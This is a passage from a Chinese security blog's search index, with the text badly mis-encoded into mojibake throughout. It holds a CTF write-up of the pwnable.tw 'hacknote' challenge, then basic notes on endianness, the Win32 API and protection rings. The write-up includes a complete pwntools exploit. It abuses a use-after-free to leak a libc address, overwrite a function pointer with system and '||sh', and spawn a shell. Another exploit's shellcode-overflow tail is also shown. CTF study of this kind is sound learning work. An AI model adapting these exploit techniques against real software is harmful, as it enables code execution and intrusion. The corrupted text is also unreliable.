\n&quot;)p.sendline(b&quot;A&quot;*24+p64(shellcode_addr))p.interactive()</code></pre><p><strong>hacknoteï¼ˆ32ä½ï¼‰</strong><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620231326851.png" alt="image-20230620231326851"></p><p>â€‹                   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221606653.png" alt="image-20230620221606653"><br>addå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620221355683.png" alt="image-20230620221355683"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620220117301.png" alt="image-20230620220117301"></p><p>æ¡†ä½éƒ¨åˆ†æŒæ¡æ§åˆ¶ä¿¡æ¯ sizeå¯¹åº”çš„chunkå¯ç”±ç”¨æˆ·è‡ªå®šä¹‰ï¼ˆuafï¼‰controlä¸Šæœªputs ä¸‹ä¸ºsub</p><p>deleteå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222639346.png"></p><p>ç”±ä¸‹è‡ªä¸Šfreeä¸¤ä¸ªchunk ä½†æŒ‡é’ˆæœªè¢«é”€æ¯ åŒfreeï¼ˆuafï¼‰<br>æ”»å‡»ç¬¬ä¸€æ­¥ï¼š<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222239841.png" alt="image-20230620222239841"></p><p>mallocä¸¤æ¬¡ï¼ˆå†™å…¥åƒåœ¾æ•°æ®çš„chunk+ç®¡ç†æ§åˆ¶ä¿¡æ¯çš„chunkï¼‰</p><p>ç¬¬äºŒæ­¥<br>deleteä¸¤ä¸ªchunk ç›¸åŒå¤§å°chunkè¿›å…¥åŒä¸€fast bin self_putsç¬¬ä¸€ä¸ªå­—é•¿å˜ä¸ºfdçš„ç¬¬ä¸€ä¸ªå…¶ä»–æœªå˜ï¼ˆåŒ…æ‹¬æŒ‡é’ˆï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620222903872.png"></p><p>mallocä¸¤æ¬¡houå<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620223247527.png" alt="image-20230620223247527"></p><p>ä¼ å‚ç”¨self_puts åœ°å€  sub_chunkå†™å…¥â€”&gt;puts_got<br>æ³„éœ²</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620224148329.png" alt="image-20230620224148329"></p><p>printï¼ˆ0ï¼‰å¯¹æ¥è¿œç¨‹çš„puts<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230216527.png"></p><p>0æ­¤æ—¶ä¿å­˜çš„å‡½æ•°åœ°å€ è·å–0çš„åœ°å€è¿›è€Œåˆ©ç”¨ä¸¤ä¸ªchunkå—<br>0ä¸­ç¬¬ä¸€éƒ¨åˆ†ä¼ å…¥systemåœ°å€ï¼ˆæ— å¯é¿å…ï¼‰ç”¨||ï¼ˆæˆ–ï¼‰shã€å‰ä¸€æ¡è¯­å¥æ‰§è¡Œå¤±è´¥åˆ™æ‰§è¡Œshã€‘å¦™å“‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620230551936.png" alt="image-20230620230551936"></p><pre><code class="python">from pwn import * #p = remote(&quot;chall.pwnable.tw&quot;,10102)p=process(&quot;./hacknote&quot;)elf = ELF(&quot;./hacknote&quot;)libc = ELF(&quot;./libc_32.so.6&quot;)read_got = elf.got[&quot;read&quot;]pfputs = 0x804862b def add_note(size,index):      p.recvuntil(b&quot;choice :&quot;)      p.sendline(b&quot;1&quot;)      p.recvuntil(b&quot;size :&quot;)      p.sendline(size)      p.recvuntil(b&quot;Content :&quot;)      p.sendline(index) def delete_note(index):      p.recvuntil(b&quot;choice :&quot;)      p.sendline(b&quot;2&quot;)      p.recvuntil(b&quot;Index :&quot;)      p.sendline(index) def print_note(index):      p.recvuntil(b&quot;choice :&quot;)      p.sendline(b&quot;3&quot;)      p.recvuntil(b&quot;Index :&quot;)      p.sendline(index)#p.interactive()add_note(b&quot;16&quot;,b&quot;aaaaa&quot;)add_note(b&quot;16&quot;,b&quot;aaaaa&quot;)delete_note(b&#39;0&#39;)delete_note(b&#39;1&#39;)add_note(b&#39;8&#39;,p32(pfputs)+p32(read_got))print_note(b&#39;0&#39;)pfread = u32(p.recv()[0:4])pfsys = pfread - 0xd41c0 + 0x3a940#p.interactive()delete_note(b&#39;2&#39;)#p.interactive()#p.recv()#p.interactive()add_note(b&#39;8&#39;,p32(pfsys)+b&quot;||sh&quot;)print_note(b&#39;0&#39;)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å¯†ç³»åˆ—basic</title>
      <link href="/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/"/>
      <url>/2023/09/01/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%5B%E5%9F%BA%E7%A1%80%E7%AF%87%5D/</url>
      
        <content type="html"><![CDATA[<p><em>è§£å¯†ç³»åˆ—[åŸºç¡€ç¯‡]</em></p><h3 id="å¤šå­—èŠ‚å­˜å‚¨é¡ºåº"><a href="#å¤šå­—èŠ‚å­˜å‚¨é¡ºåº" class="headerlink" title="å¤šå­—èŠ‚å­˜å‚¨é¡ºåº"></a><strong>å¤šå­—èŠ‚å­˜å‚¨é¡ºåº</strong></h3><p>ä¸¤ç§ç¼–ç åŒºåˆ«:<br>**Big-Endian:**é«˜ä½å­—èŠ‚å­˜å…¥ä½åœ°å€ï¼Œä½ä½å­—èŠ‚å­˜å…¥é«˜åœ°å€ï¼Œä¾æ¬¡æ’åˆ—ã€‚<br>**Little-Endian :**ä½ä½å­—èŠ‚å­˜å…¥ä½åœ°å€ï¼Œé«˜ä½å­—èŠ‚å­˜å…¥é«˜åœ°å€ï¼Œååºæ’åˆ—         å¤šå­—èŠ‚æ•°æ®å­˜æ”¾é¡ºåºä¸CPUæœ‰å…³ã€‚</p><p>å¾®å¤„ç†å™¨ä¸­å­˜æ”¾é¡ºåºæœ‰æ­£åºï¼ˆ Big-Endianï¼‰å’Œé€†åº(Little-Endianï¼‰ (ä¹Ÿç§°å¤§ç«¯å­˜å‚¨å’Œå°ç«¯å­˜å‚¨)ä¹‹åˆ†ã€‚<br>å¸¸è§çš„Intelç³»åˆ—ä½¿ç”¨çš„ç¼–ç æ–¹å¼å±äºLittle-Endianç±»ï¼›æŸäº›RISCæ¶æ„çš„CPUÂ·OIBM6Power-PCç­‰å±äºBig-Endianç±»ã€‚</p><p>è¡¥å……ï¼šASCII ï¼ˆ American Standard Code for InformationInterchangeÂ·ç¾å›½ä¿¡æ¯äº’æ¢æ ‡å‡†ä»£ç ) 0-256ã€‚<br>Unicodeå­—ç¬¦ç¼–ç çš„ç¼–ç èŒƒå›´æ˜¯ï¸°0-65535Â·å®ƒåŒ…å«ä¸‰å¥—ç¼–ç æ–¹å¼å¦‚ :UTF-8Â·UTF-16å’ŒUTF-32Â·å®ƒå’ŒASCIIçš„å…³ç³»ä¸ºASCIIå­—ç¬¦ç¼–ç æ˜¯Unicodeå­—ç¬¦ç¼–ç çš„ä¸€éƒ¨åˆ†ã€‚</p><h3 id="Win-APIç®€ä»‹"><a href="#Win-APIç®€ä»‹" class="headerlink" title="Win APIç®€ä»‹:"></a><strong>Win APIç®€ä»‹:</strong></h3><p>Windows APIå°±æ˜¯windowsåº”ç”¨ç¨‹åºæ¥å£ï¼Œæ˜¯é’ˆå¯¹microsoft windowsæ“ä½œç³»ç»Ÿå®¶æ—çš„ç³»ç»Ÿç¼–ç¨‹æ¥å£ï¼Œè¿™æ ·çš„ç³»ç»ŸåŒ…æ‹¬Windows 7 Â·Windows Vista - WindowsXP -Windows Server 2003 Â·Windows 2000-Windows95 Â·Windows 98-Windows Me (Millennium Editonï¼‰å’ŒOWindows CEç­‰å‡ ä¹æ‰€æœ‰ç‰ˆæœ¬ã€‚å®ƒè¢«è®¾è®¡ä¸ºå„ç§è¯­è¨€çš„ç¨‹åºè°ƒç”¨ï¼Œä¹Ÿæ˜¯åº”ç”¨è½¯ä»¶ä¸Windowsç³»ç»Ÿæœ€ç›´åŸ¹çš„äº¤äº’æ–¹å¼ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/IZFRQK66[MK~]3S%7D62$Y4KJ.png" alt="img"></p><p><strong>åŠ¨æ€é“¾æ¥åº“</strong>ï¸°åŠ¨æ€é“¾æ¥å°±æ˜¯æŠŠä¸€äº›ç»å¸¸ä¼šå…±ç”¨çš„ä»£ç ï¼ˆé™æ€é“¾åŸ¹çš„OBJç¨‹åºåº“ï¼‰åˆ¶ä½œæˆDLLæ–‡ä»¶ã€‚å½“å¯æ‰§è¡Œæ–‡ä»¶è°ƒç”¨åˆ°DLLæ–‡ä»¶å†…çš„å‡½æ•°æ—¶windowsæ“ä½œç³»ç»Ÿæ‰ä¼šæŠŠDLLæ–‡ä»¶åŠ è½½å­˜å‚¨å™¨å†…ã€‚<br>DLLæ–‡ä»¶æœ¬èº«çš„ç»“æ„å°±æ˜¯æ‰§iè¡Œæ–‡ä»¶ï¼ˆPEï¼‰ ,å½“ç¨‹åºéœ€æ±‚å‡½æ•°æ‰è¿›è¡Œé“¾æ¥ï¼Œé€šè¿‡åŠ¨æ€é“¾æ¥æ–¹å¼ï¼Œå­˜å‚¨å™¨æµªè´¹çš„æƒ…å½¢å°†å¤§å¹…é™ä½ã€‚                           <strong>kernel32.dll</strong>:æ§åˆ¶ç€ç³»ç»Ÿçš„å†…å­˜ç®¡ç†ï¹‘æ•°æ®çš„è¾“å…¥è¾“å‡ºæ“ä½œå’Œä¸­æ–­å¤„ç†ã€‚å½“Windowså¯åŠ¨æ—¶ï¼Œkernel32.dllå°±é©»ç•™åœ¨å†…å­˜ä¸­ç‰¹å®šçš„å†™ä¿æŠ¤åŒºåŸŸï¼Œä½¿åˆ«çš„ç¨‹åºæ— æ³•å ç”¨è¿™ä¸ªå†…å­˜åŒºåŸŸã€‚<br><strong>user32.dll</strong>: Windowsç”¨æˆ·ç•Œé¢ç›¸å…³åº”ç”¨ç¨‹åºæ¥å£ï¼Œç”¨äºåŒ…æ‹¬Windowså¤„ç†ã€åŸºæœ¬ç”¨æˆ·ç•Œé¢ç­‰ç‰¹æ€§ã€‚å¦‚åˆ›å»ºçª—å£å’Œå‘é€æ¶ˆæ¯ã€‚<br><strong>gdi32.dll</strong>:æ˜¯Windows GDIå›¾å½¢ç”¨æˆ·ç•Œé¢ç›¸å…³ç¨‹åºï¼ŒåŒ…å«çš„å‡½æ•°ç”¨æ¥ç»˜åˆ¶å›¾åƒå’Œæ˜¾ç¤ºæ–‡å­—ã€‚   </p><p><strong>å¥æŸ„</strong>ï¼šæ˜¯æ•´ä¸ªwindowsç¼–ç¨‹çš„åŸºç¡€ã€‚<u>ä¸€ä¸ªå¥æŸ„æ˜¯æŒ‡ä½¿ç”¨çš„ä¸€ä¸ªå”¯ä¸€çš„æ•´æ•°å€¼</u><u>ï¼Œç”¨äºæ ‡å¿—åº”ç”¨ç¨‹åºä¸­çš„ä¸åŒå¯¹è±¡å’ŒåŒç±»å¯¹è±¡ä¸­çš„ä¸åŒçš„å®ä¾‹</u>ã€‚<br>ä¾‹ï¼šä¸€ä¸ªçª—å£ï¼ŒæŒ‰é’®ï¼Œå›¾æ ‡ï¼Œæ»šåŠ¨æ¡ï¼Œè¾“å‡ºè®¾å¤‡ï¼Œæ§ä»¶æˆ–è€…æ–‡ä»¶ç­‰ã€‚åº”ç”¨ç¨‹åºèƒ½å¤Ÿé€šè¿‡å¥æŸ„è®¿é—®ç›¸åº”çš„å¯¹è±¡çš„ä¿¡æ¯ã€‚<br>å¥æŸ„æ˜¯windowsç”¨æ¥æ ‡å¿—åº”ç”¨ç¨‹åºä¸­å»ºç«‹çš„æˆ–æ˜¯ä½¿ç”¨çš„å”¯ä¸€æ•´æ•°windowsä½¿ç”¨äº†å¤§é‡çš„å¥æŸ„æ¥æ ‡å¿—å¾ˆå¤šå¯¹è±¡ã€‚</p><p>HWndï¼šå¸¦æ–‡æœ¬çš„çª—å£æˆ–æ§ä»¶çš„å¥æŸ„ã€‚<br>IpStringï¼šæŒ‡å‘æ¥æ”¶æ–‡æœ¬çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚<br>nMaxCountï¼šæŒ‡å®šè¦ä¿å­˜åœ¨ç¼“å†²åŒºå†…çš„å­—ç¬¦çš„æœ€å¤§ä¸ªæ•°ï¼Œå…¶ä¸­åŒ…å«NULLå­—ç¬¦      </p><h3 id="HWND-GetDlgItemå‡½æ•°"><a href="#HWND-GetDlgItemå‡½æ•°" class="headerlink" title="HWND GetDlgItemå‡½æ•°"></a><strong>HWND GetDlgItemå‡½æ•°</strong></h3><pre><code>hwndScroll = GetDlgItem(hwnd, IDC_SCROLL);       </code></pre><p> å‡è®¾ä¸€ä¸ªçˆ¶çª—å£ä¸­æœ‰å¤šä¸ªå­çª—å£ï¼Œé‚£ä¹ˆæœ¬å‡½æ•°æ˜¯è¿”å›ä¸€ä¸ªå­çª—å£å¥æŸ„ã€‚ç¬¬ä¸€ä¸ªå‚æ•°ï¼šçˆ¶çª—å£å¥æŸ„     ç¬¬äºŒä¸ªå‚æ•°ï¼šå­çª—å£    UINT </p><h3 id="IDUINT-GetDlgItemTextå‡½æ•°"><a href="#IDUINT-GetDlgItemTextå‡½æ•°" class="headerlink" title="IDUINT GetDlgItemTextå‡½æ•°"></a><strong>IDUINT GetDlgItemTextå‡½æ•°</strong></h3><p>â€‹<br>ï¼ˆæ£€ç´¢ä¸å¯¹è¯æ¡†ä¸­çš„æ§ä»¶å…³è”çš„æ ‡é¢˜æˆ–æ–‡æœ¬ï¼‰                                                                                 </p><pre><code>GetDlgItemText(  HWND hDlg,       // handle to dialog box  int nIDDlgItem,  // control identifier  LPTSTR lpString, // pointer to buffer for text  int nMaxCount    // maximumsize of string);                                      </code></pre><h3 id="GetwindowTextå‡½æ•°"><a href="#GetwindowTextå‡½æ•°" class="headerlink" title="GetwindowTextå‡½æ•°"></a><strong>GetwindowTextå‡½æ•°</strong></h3><p>å°†æŒ‡å®šçª—å£çš„æ ‡é¢˜æ¡æ–‡æœ¬ï¼ˆå¦‚æœå­˜åœ¨ï¼‰æ‹·è´åˆ°ä¸€ä¸ªç¼“å­˜åŒºå†…ã€‚             å¦‚æœæŒ‡å®šçš„çª—å£æ˜¯ä¸€ä¸ªæ§ä»¶ï¼Œåˆ™æ‹·è´æ§ä»¶çš„æ–‡æœ¬ã€‚                <u>GetWindowTextä¸èƒ½æ¥æ”¶åœ¨å…¶ä»–åº”ç”¨ç¨‹åºä¸­çš„æ§ä»¶çš„æ–‡æœ¬ã€‚</u></p><pre><code>int GetWindowText(  HWND hWnd,        // handle to window or control  LPTSTR lpString,  // text buffer  int nMaxCount     // maximum number of characters to copy);</code></pre><h3 id="UINT-GetDlgItemIntå‡½æ•°"><a href="#UINT-GetDlgItemIntå‡½æ•°" class="headerlink" title="UINT GetDlgItemIntå‡½æ•°"></a><strong>UINT GetDlgItemIntå‡½æ•°</strong></h3><p>ï¼ˆå°†å¯¹è¯æ¡†ä¸­æŒ‡å®šæ§ä»¶çš„æ–‡æœ¬è½¬æ¢ä¸ºæ•´æ•°å€¼ï¼‰                                                     </p><pre><code>UINT GetDlgItemInt(  HWND hDlg,           // handle to dialog box  int nIDDlgItem,      // control identifier  BOOL *lpTranslated,  // success state  BOOL bSigned         // signed or unsigned value);</code></pre><h3 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h3><p>ï¼ˆè¿™ä¸ªAPIæ–¹æ³•ç”¨æ¥åˆ›å»ºã€æ˜¾ç¤ºã€æ“ä½œä¸€ä¸ªæ¶ˆæ¯æ¡†ã€‚å®ƒåŒ…å«å¯è®¾ç½®çš„æ¶ˆæ¯å†…å®¹ã€æ ‡é¢˜ï¼Œè¿˜å¯ä»¥æ·»åŠ é¢„å®šä¹‰çš„å›¾æ ‡ã€æ”¾ç½®æŒ‰é’®ï¼‰int </p><pre><code>int MessageBox(  HWND hWnd,          // handle to owner window  LPCTSTR lpText,     // text in message box  LPCTSTR lpCaption,  // message box title  UINT uType          // message box style);</code></pre><p>NTæ¶æ„ä»å†…æ ¸åˆ°KERNEL32Â·USER32Â·GDI32éƒ½æ˜¯çº¯32ä½å®ç°ã€‚<br>NTæ¶æ„æ ‡å‡†å­—ç¬¦é›†é‡å¤´å¼€å‘ï¼Œç»Ÿä¸€ä½¿ç”¨Unicodeå­—ç¬¦é›†Â·å…¼å®¹ASCIIå­—ç¬¦é›†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/R~%60]HZH%7BDN_P3NYJL1V@MSF.png" alt="img"></p><p>åŒºåˆ«ï¼š1.å‡½æ•°è°ƒç”¨å®Œåè°æ¥æ¸…ç©ºæ ˆ2.å…¥æ ˆé¡ºåºï¼ˆä¸¤è€…å‡è‡ªå³å‘å·¦ï¼‰stdcallç”±å­ç¨‹åºå¹³è¡¡æ ˆ cdelï¼ˆcè¯­è¨€æ ‡å‡†ï¼‰ç”±è°ƒç”¨å€¼å¹³è¡¡æ ˆå›è°ƒå‡½æ•°ã€‚ï¼ˆcallbackï¼‰å›è°ƒå‡½æ•°</p><p><img src="D:\Users\lenovo\Desktop\5.png"></p><p><img src="D:\Users\lenovo\Desktop\4.png"></p><p>Windowsæ“ä½œç³»ç»Ÿæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å…¶å›¾å½¢åŒ–çš„æ“ä½œåªé¢å’Œå¤šä»»åŠ¡çš„ç®¡ç†ã€‚è¿™äº›å¼ºå¤§åŠŸèƒ½å°±æ˜¯å»ºç«‹åœ¨å…¶æ¶ˆæ¯å¤„ç†æœºåˆ¶è¿™ä¸ªåŸºç¡€ä¹‹ä¸Šçš„ã€‚Windowsç³»ç»Ÿä¸åº”ç”¨ç¨‹åºä¹‹é—´ï¼Œåº”ç”¨ç¨‹åºä¸åº”ç”¨ç¨‹åºä¹‹é—´çš„é€šè®¯å°±æ˜¯é€šè¿‡æ¶ˆæ¯æ¥è§¦å‘ï¼Œå¹¶é å¯¹æ¶ˆæ¯çš„å“åº”å’Œå¤„ç†æ¥å®Œæˆã€‚<br>Windowsç³»ç»Ÿä¸­æœ‰ä¸¤ç§æ¶ˆæ¯é˜Ÿåˆ—:ä¸€ç§æ˜¯<strong>ç³»ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—</strong>ï¼Œå¦ä¸€ç§æ˜¯<strong>åº”ç”¨ç¨‹åºæ¶ˆæ¯é˜Ÿåˆ—</strong>ã€‚Windowsæœ¬èº«æ˜¯ç”±æ¶ˆæ¯é©±åŠ¨ï¼Œå½“è°ƒè¯•ç¨‹åºæ—¶è·Ÿè¸ªä¸€ä¸ªæ¶ˆæ¯ä¼šå¾—åˆ°ç›¸å½“åº•å±‚çš„ç­”æ¡ˆã€‚                                                                        Windowsä¸ºå½“å‰æ‰§è¡Œçš„æ¯ä¸ªWindowsç¨‹åºç»´æŠ¤ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ã€‚<u>åœ¨å‘ç”ŸæŸäº‹ä»¶ä¹‹åï¼Œç³»ç»Ÿå°†è¯¥äº‹ä»¶è½¬æ¢ä¸ºä¸€ä¸ªæ¶ˆæ¯ï¼Œå¹¶å°†æ¶ˆæ¯æŠ•æ”¾å…¥ç¨‹åºæ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚</u>ç¨‹åºé€šè¿‡iè¡Œä¸€å—ç§°ä¹‹ä¸ºæ¶ˆæ¯å¾ªç¯çš„ç¨‹åºä»£ç ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯!å…¶å®âˆ¶<strong>æ¶ˆæ¯ä¸è¿‡æ˜¯å®šä¹‰ä¸€ä¸ªç»“æ„ã€‚å®šä¹‰ä¸€å †IDï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è°ƒç”¨switch caseæ‹¦æˆªå»å®Œæˆå·³åº”çš„åŠŸèƒ½ã€‚</strong></p><pre><code>while(GetMessage (&amp;msg, NULL,0,0))                               &#123;TranslateMessage (&amp;msg);//ç¿»è¯‘æ¶ˆæ¯DispatchMessage (&amp;msg); &#125;//åˆ†é…æ¶ˆæ€»</code></pre><p><strong>SendMessageå‡½æ•°</strong>                                                                                å°†æŒ‡å®šçš„æ¶ˆæ¯å‘é€åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªçª—å£ã€‚</p><pre><code>LRESULT [SendMessage]ï¼ˆHWND hWndï¼ŒUINT Msgï¼ŒWPARAM wParamï¼ŒLPARAM IParamï¼‰ï¼›</code></pre><h3 id="WM-COMMAND"><a href="#WM-COMMAND" class="headerlink" title="WM_COMMAND"></a><strong>WM_COMMAND</strong></h3><p>äº§ç”Ÿçš„æ¡ä»¶ï¼šç‚¹å‡»<strong>èœå•</strong>ï¼Œ ç‚¹å‡»<strong>åŠ é€Ÿé”®</strong>ï¼ˆé”®ç›˜å¿«æ·é”®ï¼Œæ˜¯ä¸€ä¸ªæˆ–å‡ ä¸ªæŒ‰é”®çš„ç»„åˆï¼Œå®ƒç”¨äºæ¿€æ´»ç‰¹å®šçš„å‘½ä»¤ï¼Œä½¿ç”¨åŠ é€Ÿé”®ä¸éœ€è¦è´¹åŠ›ç§»åŠ¨é¼ æ ‡å°±èƒ½æ¿€æ´»èœå•é¡¹ï¼‰ï¼Œç‚¹å‡»çª—å£<strong>æŒ‰é’®</strong>ï¼Œç‚¹å‡»<strong>å·¥å…·æ æŒ‰é’®</strong>ã€‚è¿™äº›æ—¶å€™éƒ½æœ‰commandæ¶ˆæ¯äº§ç”Ÿã€‚<br> wParam é«˜ä¸¤ä¸ªå­—èŠ‚ é€šçŸ¥ç <br>wParam ä½ä¸¤å­—èŠ‚ å‘½ä»¤ID<br>lParam å‘é€å‘½ä»¤æ¶ˆæ¯çš„å­çª—ä½“å¥æŸ„ã€‚<br> <strong>WM_GETTEXT</strong><br> <strong>WM_QUIT</strong><br><strong>WM_LBUTTONDOWN</strong><br><strong>WM_RBUTTONUP</strong><br><strong>WM_KEYUP</strong><br>ï¼ˆå¯è‡ªè¡ŒæŸ¥è¯¢ç›¸åº”ç”¨æ³•åŠä½œç”¨ æˆ‘ä¹Ÿæ˜¯å¤§æ‡’è™«æã€ğŸ˜€ã€‘ï¼‰</p><h3 id="å®æ¨¡å¼"><a href="#å®æ¨¡å¼" class="headerlink" title="å®æ¨¡å¼"></a><strong>å®æ¨¡å¼</strong></h3><p>ç¨‹åºæŒ‡ä»¤åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸€èˆ¬éœ€è¦æœ‰å„ç§æ•°æ®,x86ç³»åˆ—CSã€DSã€ESã€FSã€SSç­‰ç”¨äºæŒ‡ç¤ºä¸åŒç”¨æ¶‚çš„æ•°æ®æ®µåœ¨å†…å­˜ä¸­çš„ä½ç½®ã€‚<br>x86ç³»åˆ—ä½¿ç”¨ä¸­æ–­æœºåˆ¶æ¥å®ç°ç³»ç»ŸæœåŠ¡ã€‚<br>å¯„å­˜å™¨çš„æ‰©å±•ä¹‹è·¯âˆ¶<br>8086ä»¥å‰ï¼ˆ 8bitï¼‰ -&gt;8086ï¼ˆ 16bitï¼‰ -&gt;80386(32bit)-&gt;ç°åœ¨çš„64bitCPU</p><p>å¯„å­˜å™¨ï¼ˆAL) -&gt;(AX)-&gt;ï¼ˆEAXï¼‰-&gt;(RAX)                                                         </p><h3 id="ä¿æŠ¤æ¨¡å¼âˆ¶æ— è®ºå®æ¨¡å¼è¿˜æ˜¯ä¿æŠ¤æ¨¡å¼æ ¹æœ¬çš„é—®é¢˜éƒ½ä¸ºç¨‹åºå¦‚ä½•åœ¨å…¶ä¸­è¿è¡Œã€‚"><a href="#ä¿æŠ¤æ¨¡å¼âˆ¶æ— è®ºå®æ¨¡å¼è¿˜æ˜¯ä¿æŠ¤æ¨¡å¼æ ¹æœ¬çš„é—®é¢˜éƒ½ä¸ºç¨‹åºå¦‚ä½•åœ¨å…¶ä¸­è¿è¡Œã€‚" class="headerlink" title="ä¿æŠ¤æ¨¡å¼âˆ¶æ— è®ºå®æ¨¡å¼è¿˜æ˜¯ä¿æŠ¤æ¨¡å¼æ ¹æœ¬çš„é—®é¢˜éƒ½ä¸ºç¨‹åºå¦‚ä½•åœ¨å…¶ä¸­è¿è¡Œã€‚"></a><strong>ä¿æŠ¤æ¨¡å¼</strong>âˆ¶æ— è®ºå®æ¨¡å¼è¿˜æ˜¯ä¿æŠ¤æ¨¡å¼æ ¹æœ¬çš„é—®é¢˜éƒ½ä¸ºç¨‹åºå¦‚ä½•åœ¨å…¶ä¸­è¿è¡Œã€‚</h3><p>å’Œå®æ¨¡å¼ä¸‹ä¸€æ ·ï¼Œä¿æŠ¤æ¨¡å¼ä¸‹ç¨‹åºè¿è¡Œçš„å®è´¨ä»æ˜¯â€œCPUæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ“ä½œç›¸å…³æ•°æ®â€ã€‚ä¸»è¦æ”¹å˜çš„æ˜¯å¯»å€çš„æ–¹å¼ï¼Œä¿æŠ¤æ¨¡å¼åœ¨å¯»å€æ–¹å¼ä¸Šâ€œåŠ¨äº†æ‰‹è„šâ€â€ï¼Œä¸ºçš„æ˜¯èµ·åˆ°â€œä¿æŠ¤ä½œç”¨â€ã€‚</p><p><strong>ä¿æŠ¤æ¨¡å¼</strong><br><u>ä¸€.ä¸åŒä»»åŠ¡ä¹‹é—´çš„ä¿æŠ¤âˆ¶</u><br>é€šè¿‡æŠŠæ¯ä¸ªä¸åŒçš„ä»»åŠ¡æ”¾åœ¨ä¸åŒçš„è™šæ’åœ°å€ç©ºé—´ä¸­ï¹æ¥å®ç°ä¸åŒä»»åŠ¡ä¹‹é—´çš„éš”ç¦»ï¼ˆå³Aç¨‹åºä¸èƒ½è®¿é—®å’Œä¿®æ”¹Bç¨‹åºçš„ä»£ç å’Œæ•°æ®ï¼‰Â·ä»¥è¾¾åˆ°ç¨‹åºé—´çš„éš”ç¦»;<br><u>äºŒ.åŒä¸€ä»»åŠ¡çš„ä¿æŠ¤âˆ¶</u><br>åœ¨æ¯ä¸€ä»»åŠ¡ä¹‹å†…å®šä¹‰äº†4ç§ä¿æŠ¤çº§åˆ«Â·æ–¹åˆ«ä¸º0ï¼Œ1ï¼Œ2ï¼Œ3æŒ‰ç¯çš„æ–¹å¼è¡¨ç¤º.</p><p><img src="D:\Users\lenovo\Desktop\3.jpg"></p><p>å…¶ä¸­ï¼Œ0çº§ä»£è¡¨æœ€é«˜çš„æƒé™çº§åˆ«ï¼Œ3çº§ä»£è¡¨æœ€ä½æƒé™çº§åˆ«ã€‚æŒ‰ç¯çš„æ–¹å¼æ¥è¡¨ç¤ºã€‚å…¶ä¸­ï¼Œç¯0ã€1ã€2ä¸ºç³»ç»Ÿçº§ï¼Œç¯3ä¸ºç”¨æˆ·çº§ã€‚<br>ä¸€èˆ¬çš„ç³»ç»Ÿåªèƒ½ä½¿ç”¨ç¯0å’Œç¯3ä¸¤ä¸ªçº§åˆ«ã€‚                                             å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæœ€å¤–å±‚çš„CodeAP1åªèƒ½è®¿é—®DataAP1ã€‚ä¸èƒ½è®¿é—®åŒçº§çš„å¦ä¸€åº”ç”¨ç¨‹åºçš„DataAP2;åŒæ ·Â·CodeAP2åªèƒ½è®¿i6DataAP2 ä¸èƒ½è®¿DataAP1 ã€‚                                                                                            è¦è¯´æ˜çš„æ˜¯ï¼š<strong>å¦‚æœåº”ç”¨ç¨‹åºæ‹¥æœ‰ç¬¬0çº§çš„æƒé™ï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥æ‰§è¡Œæ‰€æœ‰çš„æŒ‡ä»¤å¹¶è®¿é—®æ‰€æœ‰çš„æ•°æ®ã€‚</strong><br>å¦‚æœåº”ç”¨ç¨‹åºæ‹¥æœ‰çš„æƒé™çº§åˆ«æ˜¯ç¬¬3çº§ï¼Œå®ƒæ‰§è¡Œçš„æŒ‡ä»¤æ˜¯æœ‰é™çš„ï¼Œèƒ½è®¿é—®çš„æ•°æ®ä¹Ÿæ˜¯æœ‰é™çš„ï¼ˆè¢«ä¿æŠ¤)  ã€‚                                                                           æ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒå±‚æ˜¯è¿è¡Œåœ¨Ring 0çº§ã€‚<br>WIN32å­ç³»ç»Ÿï¼ˆKEDNET32.DLL ã€å†…å­˜çš„ç®¡ç†ã€‘USER32.DLLã€æ“ä½œç”¨æˆ·çš„ç•Œé¢ã€‘ ï¼ŒGDI32.DLLã€æ“ä½œå›¾åƒçš„ç•Œé¢ã€‘ç­‰ï¼‰æ˜¯è¿è¡Œåœ¨Ring3çº§çš„ï¼Œä»¥æä¾›ä¸å­ç¨‹åºçš„æ¥å£ã€‚</p><h3 id="è™šæ‹Ÿå†…å­˜ï¼ˆç¡®å®å­˜åœ¨äºç¡¬ç›˜ä¸­ï¼‰âˆ¶"><a href="#è™šæ‹Ÿå†…å­˜ï¼ˆç¡®å®å­˜åœ¨äºç¡¬ç›˜ä¸­ï¼‰âˆ¶" class="headerlink" 